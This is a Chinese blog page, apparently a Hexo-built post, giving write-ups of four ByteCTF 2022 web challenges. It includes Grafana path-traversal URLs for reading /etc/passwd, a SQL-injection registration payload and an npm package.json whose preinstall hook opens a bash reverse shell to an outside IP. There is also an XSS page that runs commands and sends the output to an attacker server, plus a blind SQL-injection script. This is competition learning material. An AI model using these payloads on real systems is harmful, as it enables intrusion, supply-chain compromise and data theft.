@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="title: 2021 ByteCTF-2022 webcategories: 赛题wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Y0ng的博客">
+<meta property="og:url" content="http://example.com/2022/09/27/byte/index.html">
+<meta property="og:site_name" content="Y0ng的博客">
+<meta property="og:description" content="title: 2021 ByteCTF-2022 webcategories: 赛题wp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927171917880.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925221845070.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924162016193.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924162206065.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924162357119.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924162042567.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925195249316.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924181437087.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924181223543.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925224008708.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927154934708.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927163408414.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927163546869.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927163903976.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925225908732.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925225930544.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925225950569.png">
+<meta property="article:published_time" content="2022-09-27T09:19:40.466Z">
+<meta property="article:modified_time" content="2022-09-27T09:19:32.122Z">
+<meta property="article:author" content="Y0ng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927171917880.png">
+
+<link rel="canonical" href="http://example.com/2022/09/27/byte/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | Y0ng的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y0ng的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">11</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">97</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/27/byte/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="Y0ng">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-09-27 17:19:40 / 修改时间：17:19:32" itemprop="dateCreated datePublished" datetime="2022-09-27T17:19:40+08:00">2022-09-27</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title: 2021 ByteCTF-2022 web</span><br><span class="line">categories: 赛题wp</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927171917880.png" alt="image-20220927171917880"></p>
+<a id="more"></a>
+
+<h1 id="easy-grafana"><a href="#easy-grafana" class="headerlink" title="easy_grafana"></a>easy_grafana</h1><p>历史CVE</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;public&#x2F;plugins&#x2F;text&#x2F;#&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;public&#x2F;plugins&#x2F;text&#x2F;#&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;grafana&#x2F;grafana.ini</span><br><span class="line">&#x2F;public&#x2F;plugins&#x2F;text&#x2F;#&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;grafana&#x2F;grafana.db</span><br></pre></td></tr></table></figure>
+
+<p>下载db文件后利用：<a target="_blank" rel="noopener" href="https://github.com/A-D-Team/grafanaExp">A-D-Team/grafanaExp</a>，解密db文件</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925221845070.png" alt="image-20220925221845070"></p>
+<p>FLAG：ByteCTF{e292f461-285e-47fc-9210-b9cd233773cb}</p>
+<h1 id="ctf-cloud"><a href="#ctf-cloud" class="headerlink" title="ctf_cloud"></a>ctf_cloud</h1><p>注册功能存在sql注入可修改admin密码</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924162016193.png" alt="image-20220924162016193"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;c&quot;,&quot;password&quot;:&quot;1&#39;,0),(&#39;admin&#39;,&#39;a&#39;,1)--&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>upload功能不允许目录穿越，文件名与内容可任意写</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924162206065.png" alt="image-20220924162206065"></p>
+<p>编译功能允许写入package.json中的 dependencies</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924162357119.png" alt="image-20220924162357119"></p>
+<p>run功能去利用npm安装</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924162042567.png" alt="image-20220924162042567"></p>
+<p>也就是我们可以利用dependencies功能去可控package.json中的npm包。制作一个恶意的npm包发布然后修改package.json，<a target="_blank" rel="noopener" href="https://juejin.cn/post/6987695534504935438">创建并发布一个npm 包</a></p>
+<p>构造恶意package.json利用 <strong>preinstall</strong> 执行命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;y0ngtest&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.8&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;test for shell&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;app.js&quot;,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;preinstall&quot;: &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;124.222.115.141&#x2F;9000 0&gt;&amp;1&#39;&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;author&quot;: &quot;&quot;,</span><br><span class="line">  &quot;license&quot;: &quot;ISC&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>push</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925195249316.png" alt="image-20220925195249316"></p>
+<p>写入恶意包，run功能触发npm安装</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924181437087.png" alt="image-20220924181437087"></p>
+<p>测试收到/etc/passwd成功</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924181223543.png" alt="image-20220924181223543"></p>
+<p>shell：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925224008708.png" alt="image-20220925224008708"></p>
+<p>删除恶意包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm unpublish y0ngtest --force</span><br></pre></td></tr></table></figure>
+
+<p>FLAG：ByteCTF{c98ecaae-4e6e-43da-a084-1f0d99034420}</p>
+<h1 id="typing-game"><a href="#typing-game" class="headerlink" title="typing_game"></a>typing_game</h1><p>附件/status下可以4字符的命令执行，有ip检测。/report访问任意html可打xss</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927154934708.png" alt="image-20220927154934708"></p>
+<p>在玩完游戏后name存在xss</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927163408414.png" alt="image-20220927163408414"></p>
+<p>这题关键就是怎么利用xss从words中将word填入到框框里，利用iframe.contentWindow.location.replace不断刷新 hash</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927163546869.png" alt="image-20220927163546869"></p>
+<p>抄个exp</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;iframe width&#x3D;&quot;100%&quot; height&#x3D;&quot;500px&quot; id&#x3D;&quot;iframe&quot; src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:13002&#x2F;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        cmd &#x3D; &quot;env&quot;</span><br><span class="line">        cmd &#x3D; &#96;fetch(&quot;http:&#x2F;&#x2F;127.0.0.1:13002&#x2F;status?cmd&#x3D;$&#123;cmd&#125;&quot;).then(x&#x3D;&gt;x.text()).then(x&#x3D;&gt;fetch(&quot;http:&#x2F;&#x2F;your-server?data&#x3D;&quot;+x))&#96;</span><br><span class="line">        cmd &#x3D; btoa(cmd)</span><br><span class="line">        url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:13002&#x2F;?name&#x3D;%3Cimg%20src%3Dx%20onerror%3D&#39;eval(atob(%22&quot;+cmd+&quot;%22))&#39;)%3E&quot;</span><br><span class="line">        const words &#x3D;[&#39;web&#39;, &#39;bytedance&#39;, &#39;ctf&#39;, &#39;sing&#39;, &#39;jump&#39;, &#39;rap&#39;, &#39;basketball&#39;, &#39;hello&#39;,&#39;world&#39;,&#39;fighting&#39;,&#39;flag&#39;,&#39;game&#39;,&#39;happy&#39;]</span><br><span class="line">        i &#x3D; 0</span><br><span class="line">        l &#x3D; 0</span><br><span class="line">        iframe.onload &#x3D; function () &#123;</span><br><span class="line">            const w &#x3D; iframe.contentWindow</span><br><span class="line">            w.location.replace(url + &quot;#&quot; + words[i]);</span><br><span class="line">            if (i &#x3D;&#x3D; 12) &#123;</span><br><span class="line">                i &#x3D; 0;</span><br><span class="line">                if (l++ &gt; 13) &#123;</span><br><span class="line">                    fetch(&#39;&#x2F;?done&#39;)</span><br><span class="line">                    iframe.onload &#x3D; function () &#123; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
+
+<p>放到服务器</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927163903976.png" alt="image-20220927163903976"></p>
+<p>FLAG：ByteCTF{074720d3-9369-4457-a1a5-2cdf1fda594b}</p>
+<p>补充，因为能直接通过report访问status直接执行命令，还可以利用4字符去rce，exp网上很多了。</p>
+<h1 id="datamanager"><a href="#datamanager" class="headerlink" title="datamanager"></a>datamanager</h1><p>登录框</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925225908732.png" alt="image-20220925225908732"></p>
+<p>注册admin</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925225930544.png" alt="image-20220925225930544"></p>
+<p>new data source有任意数据库连接，可以尝试恶意数据库读文件</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925225950569.png" alt="image-20220925225950569"></p>
+<p>基本信息为上。</p>
+<p>W&amp;M的wp：</p>
+<p>存在注入</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sre_constants <span class="keyword">import</span> SUCCESS</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">requests = requests.Session()</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;__t_id=7267900aaba9b607c88b9639ae26899a; JSESSIONID=C1032349BC4000AE184AD31889B5B0F3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#database() == datamanager</span></span><br><span class="line">url = <span class="string">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when (database() like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tables : source,users</span></span><br><span class="line">url = <span class="string">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(table_name) from information_schema.tables where table_schema like 0x646174616d616e61676572) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#columns from users: current\\_connections,total\\_connections,user,id,n4me,pas$word</span></span><br><span class="line">url = <span class="string">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(column_name) from information_schema.columns where table_name like 0x7573657273) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#n4me from users: ctf,...</span></span><br><span class="line">url = <span class="string">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(n4me) from users) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pas$word from users: ctf@BvteDaNceS3cRet,...</span></span><br><span class="line">url = <span class="string">&quot;&lt;https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id&gt; and case when ((select group_concat(pas$word) from users) like PAYLOAD) then 1 else 9223372036854775807%2B1 end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        success = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> string.printable[:-<span class="number">6</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> <span class="string">&quot;_%[]&quot;</span>:</span><br><span class="line">                i = <span class="string">&quot;\\\\&quot;</span>+i</span><br><span class="line">            payload = <span class="string">&quot;0x&quot;</span></span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> flag:</span><br><span class="line">                payload += <span class="string">&quot;%02x&quot;</span> % <span class="built_in">ord</span>(item)</span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> i:</span><br><span class="line">                payload += <span class="string">&quot;%02x&quot;</span> % <span class="built_in">ord</span>(item)</span><br><span class="line">            payload += <span class="string">&quot;25&quot;</span></span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            r = requests.get(url.replace(<span class="string">&quot;PAYLOAD&quot;</span>,payload),proxies=proxies,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="comment">#if &quot;SORRY!&quot; not in r.text:</span></span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                flag += i</span><br><span class="line">                print(flag)</span><br><span class="line">                success = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> success:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;failed&quot;</span>,flag)</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>后来用恶意sqlserver利用netdoc协议读文件去了，未能复现</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用mysql fake server来读文件。需要修改一下 handshake.py的72行d[2]改成0x21 否则报错</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/28/">ByteCTF 2022 By W&amp;M - W&amp;M Team (wm-team.cn)</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/08/31/java-dll/" rel="prev" title="初探java加载动态链接库">
+      <i class="fa fa-chevron-left"></i> 初探java加载动态链接库
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-grafana"><span class="nav-number">1.</span> <span class="nav-text">easy_grafana</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ctf-cloud"><span class="nav-number">2.</span> <span class="nav-text">ctf_cloud</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#typing-game"><span class="nav-number">3.</span> <span class="nav-text">typing_game</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#datamanager"><span class="nav-number">4.</span> <span class="nav-text">datamanager</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Y0ng"
+      src="/images/cys.jpg">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">97</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1216043519@qq.com" title="E-Mail → mailto:1216043519@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Y0ng</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
